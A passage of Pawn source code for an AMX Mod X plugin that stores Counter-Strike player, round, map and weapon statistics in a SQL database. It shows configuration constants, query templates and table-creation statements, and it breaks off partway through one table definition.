#pragma semicolon 1
#pragma compress 1
#pragma tabsize 4

#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <csx>
#include <sqlx>
#include <geoip>

#define PLUGIN					"Player Status in DB"
#define VERSION					"1.09"
#define AUTHOR					"Aoi.Kagase"
#define URL						"github.com/AoiKagase/Amxx-PSD"
#define DESCRIPTION				"The status of the player and writes in it at a database."

/*=====================================*/
/*  VERSION CHECK				       */
/*=====================================*/
#if AMXX_VERSION_NUM < 190
//	#assert "AMX Mod X v1.9.0 or greater library required!"

	#define MAX_PLAYERS			32
	#define MAX_NAME_LENGTH		32
	#define MAX_AUTHID_LENGTH	64
	#define MAX_IP_LENGTH		16
	// Parts of body for hits
	#define	MAX_BODYHITS		8

	// Constants for client statistics
	enum
	{
		STATSX_KILLS = 0,
		STATSX_DEATHS,
		STATSX_HEADSHOTS,
		STATSX_TEAMKILLS,
		STATSX_SHOTS,
		STATSX_HITS,
		STATSX_DAMAGE,
		STATSX_RANK,
		STATSX_MAX_STATS
	};

	// Constants for objective based statistics
	enum
	{
		STATSX_TOTAL_DEFUSIONS = 0,
		STATSX_BOMBS_DEFUSED,
		STATSX_BOMBS_PLANTED,
		STATSX_BOMB_EXPLOSIONS,
		STATSX_MAX_OBJECTIVE
	};
#endif

#define MAX_ERR_LENGTH			512
#define MAX_QUERY_LENGTH		2048
#define MAX_LENGTH				128
#define DEFAULT_SERVER_ID		1

#define SQL_FIELD_COMMON_STATS	"`csx_kills`,`csx_tks`,`csx_deaths`,`csx_hits`,`csx_dmg`,`csx_shots`,`csx_hs`,`h_head`,`h_chest`,`h_stomach`,`h_larm`,`h_rarm`,`h_lleg`,`h_rleg`"
#define SQL_PARAM_COMMON_STATS	"'%i','%i','%i','%i','%i','%i','%i','%i','%i','%i','%i','%i','%i','%i'"

// #define SQL_FIELD_TOTAL_OBJECT	"`server_id`,`date`, `auth_id`,`t_defusions`,`b_defused`,`b_plants`,`b_explosions`"
// #define SQL_PARAM_TOTAL_OBJECT	"'%s','%s','%s','%i','%i','%i','%i'"

#define SQL_FIELD_SERVER_INFO	"`server_id`, `server_name`"
#define SQL_PARAM_SERVER_INFO	"'%i', '%s'"

#define SQL_FIELD_USER_OBJECT	"`server_id`,`date`, `auth_id`,`t_defusions`,`b_defused`,`b_plants`,`b_explosions`"
#define SQL_PARAM_USER_OBJECT	"'%i','%s','%s','%i','%i','%i','%i'"

#define SQL_FIELD_SERVER_MAP	"`server_id`,`date`,`map_name`,`total_round`,`total_time`,`total_win_t`,`total_win_t_score`,`total_win_ct`,`total_win_ct_score`"
#define SQL_PARAM_SERVER_MAP    "'%i','%s','%s','%i','%i','%i','%i','%i','%i'"

#define SQL_FIELD_SERVER_ROUND	"`server_id`,`date`,`round`,`round_time`,`win_team`,`win_score`"
#define SQL_PARAM_SERVER_ROUND  "'%i','%s','%i','%i','%i','%i'"

#define SQL_FIELD_USER			"`auth_id`,`name`,`latest_ip`, `geoip_code2`, `online_time`"
#define SQL_PARAM_USER          "'%s','%s','%s','%s','%i'"

#define SQL_FIELD_TOTAL_STATS	"`server_id`,`auth_id`,`csx_rank`,`csx_score`,"
#define SQL_PARAM_TOTAL_STATS   "'%i','%s','%i','%i',"

#define SQL_FIELD_USER_STATS	"`server_id`,`date`, `auth_id`,`csx_rank`,`csx_score`," 
#define SQL_PARAM_USER_STATS    "'%i','%s','%s','%i','%i',"

#define SQL_FIELD_USER_RSTATS	"`server_id`,`date`,`round`,`auth_id`,`team`," 
#define SQL_PARAM_USER_RSTATS   "'%i','%s','%i','%s','%i'," 

#define SQL_FIELD_WSTATS		"`server_id`,`date`,`auth_id`,`wpn_name`,"
#define SQL_PARAM_WSTATS		"'%i','%s','%s','%s',"

#define SQL_FIELD_WRSTATS		"`server_id`,`date`,`round`,`auth_id`,`wpn_name`,"
#define SQL_PARAM_WRSTATS		"'%i','%s','%i','%s','%s',"

#define SQL_REPLACE_INTO		"REPLACE INTO `%s`.`%s`"
#define SQL_START				"("
#define SQL_VALUES				") VALUES ("
#define SQL_END					");"

#define SQL_SELECT_USER_TIME	"SELECT MAX(`online_time`) AS online_time FROM `%s`.`%s` WHERE `auth_id` = '%s' GROUP BY `auth_id` ORDER BY `online_time` DESC LIMIT 1;"
#define SQL_SELECT_USER_INFO	"SELECT `auth_id`, `latest_ip`, `geoip_code2`, SUM(`online_time`) as online_time FROM `%s`.`%s` WHERE `auth_id` = '%s' GROUP BY `auth_id`, `latest_ip`, `geoip_code2` ORDER BY `created_at` desc LIMIT 1;"

#define TASK_ID_ROUND_END		118855

enum DB_CONFIG
{
	DB_HOST[MAX_LENGTH] = 0,
	DB_USER[MAX_LENGTH],
	DB_PASS[MAX_LENGTH],
	DB_NAME[MAX_LENGTH],
}

enum TBL_DATA
{
	TBL_DATA_SERVER			[MAX_NAME_LENGTH] = 0,
	TBL_DATA_MAP			[MAX_NAME_LENGTH],
	TBL_DATA_ROUND			[MAX_NAME_LENGTH],
	TBL_DATA_USER			[MAX_NAME_LENGTH], 
	TBL_DATA_TOTAL_STATS	[MAX_NAME_LENGTH], 
	TBL_DATA_USER_STATS		[MAX_NAME_LENGTH], 
	TBL_DATA_USER_OBJECTIVE	[MAX_NAME_LENGTH], 
	TBL_DATA_USER_ROUND		[MAX_NAME_LENGTH], 
	TBL_DATA_USER_WEAPON	[MAX_NAME_LENGTH], 
	TBL_DATA_USER_RWEAPON	[MAX_NAME_LENGTH], 
}

enum SERVER_INFO
{
	SERVER_ID,
	TOTAL_ROUND,
	TOTAL_TIME,
	TOTAL_WIN_T,
	TOTAL_WIN_CT,
	TOTAL_WIN_T_SCORE,
	TOTAL_WIN_CT_SCORE,
}

enum ROUND_INFO
{
	ROUND_NUMBER,
	ROUND_TIME,
	WIN_TEAM,
	WIN_TEAM_SCORE,
}

enum E_CVARS
{
	E_CV_SERVERID,
}

//Database setting
new g_dbConfig[DB_CONFIG];
new g_tblNames[TBL_DATA] = 
{
	"server_info",
	"server_map",
	"server_round",
	"user_info",
	"total_stats",
	"user_stats",
	"user_objective",
	"user_rstats",
	"user_wstats",
	"user_wrstats",
};

//Database Handles
new Handle:g_dbTaple;
new Handle:g_dbConnect;

//update time
new g_dbError				[MAX_ERR_LENGTH];
new g_dataDir				[MAX_LENGTH];

new g_server_info			[SERVER_INFO];
new g_server_starttime		[20];
new g_server_mapname		[MAX_NAME_LENGTH];
new g_rounds_info			[ROUND_INFO];
new g_user_name				[MAX_PLAYERS][MAX_NAME_LENGTH * 3];
new g_playtime				[MAX_PLAYERS];
new g_cvars					[E_CVARS];
new g_initialize;
new g_csstats_reset;

//Create Table
init_database()
{
	new sql[MAX_QUERY_LENGTH + 1];
	new Handle:queries[10];
	new len = 0, i = 0;

	// CREATE TABLE info_server.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_SERVER]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`  		 INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `server_name`     	 VARCHAR(%d)     NOT NULL DEFAULT 0,", MAX_NAME_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 		 DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 		 DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE server_map.		Map infomation.
	//
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_MAP]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`		  INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 			  DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `map_name`     	  VARCHAR(%d)     NOT NULL DEFAULT  '',", 	MAX_NAME_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_round`     	  INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_time`     	  INT UNSIGNED 	  NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_win_t`   	  INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_win_t_score`  INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_win_ct`  	  INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `total_win_ct_score` INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 		  DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 		  DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`,`date`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE server_round.	Round infomation.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_ROUND]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`		 INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 			 DATETIME    	 NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `round`     	 	 INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `round_time`     	 INT UNSIGNED 	 NOT NULL DEFAULT 0,"); // roundtime 0 is danger!!
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `win_team`   	 	 TINYINT    	 NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `win_score`   	 	 TINYINT    	 NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 		 DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 		 DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`,`date`,`round`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE user_info.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`auth_id`     	 CHAR(%d)          NOT NULL,", MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `name`        	 VARCHAR(%d)       NOT NULL,", MAX_NAME_LENGTH * 3);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `latest_ip`   	 CHAR(%d)   	   NOT NULL,", MAX_IP_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `geoip_code2`   CHAR(%d)   	   NOT NULL,", 3);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `online_time` 	 BIGINT	UNSIGNED   DEFAULT  0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at`  	 DATETIME          NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at`  	 DATETIME          NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`auth_id`, `name`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE total_stats.	Total Status. (in csstats.dat data)
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_TOTAL_STATS]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_rank`		BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_score`	BIGINT NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_kills`    BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_tks`  	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_deaths`   BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hits`     BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_dmg`      BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_shots`    BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hs`  		BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_head`  		BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_chest`  	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_stomach` 	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_larm`   	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rarm`   	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_lleg`   	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rleg`   	BIGINT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `auth_id`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE user_stats.		User Status Per Game.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_STATS]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 	  	DATETIME	    NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_rank`		INT UNSIGNED    NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_score`	INT 			NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_kills`    INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_tks`  	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_deaths`   INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hits`     INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_dmg`      INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_shots`    INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hs`  		INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_head`  		INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_chest`  	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_stomach` 	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_larm`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rarm`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_lleg`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rleg`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `date`, `auth_id`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_OBJECTIVE]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 	  	DATETIME	    NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `t_defusions`  INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `b_defused`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `b_plants`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `b_explosions` INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `date`, `auth_id`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE user_rstats.	User Status Per Round.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_ROUND]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 	  	DATETIME	    NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `round`   	  	INT UNSIGNED    DEFAULT  0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `team`   	  	TINYINT    		NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_kills`    INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_tks`  	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_deaths`   INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hits`     INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_dmg`      INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_shots`    INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hs`  		INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_head`  		INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_chest`  	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_stomach` 	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_larm`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rarm`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_lleg`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rleg`   	INT UNSIGNED 	NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `date`, `round`, `auth_id`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE user_wstats.	Weapon Status Per Game.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_WEAPON]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 	  	DATETIME	    NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `wpn_name`  	VARCHAR(%d)     DEFAULT  '',", 	MAX_NAME_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_kills`    INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_tks`  	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_deaths`   INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hits`     INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_dmg`      INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_shots`    INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hs`  		INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_head`  		INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_chest`  	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_stomach` 	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_larm`   	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rarm`   	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_lleg`   	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rleg`   	INT UNSIGNED NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `date`, `auth_id`, `wpn_name`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);

	// CREATE TABLE user_wrstats.	Weapon Status Per Round.
	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "CREATE TABLE IF NOT EXISTS `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_RWEAPON]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " (`server_id`	INT UNSIGNED    NOT NULL DEFAULT 1,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `date` 	  	DATETIME	    NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `round`   	  	INT UNSIGNED    DEFAULT  0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `auth_id`    	VARCHAR(%d)     NOT NULL,", 	MAX_AUTHID_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `wpn_name`  	VARCHAR(%d)     DEFAULT  '',", 	MAX_NAME_LENGTH);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_kills`    INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_tks`  	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_deaths`   INT UNSIGNED   NOT NULL DEFAULT 0,");
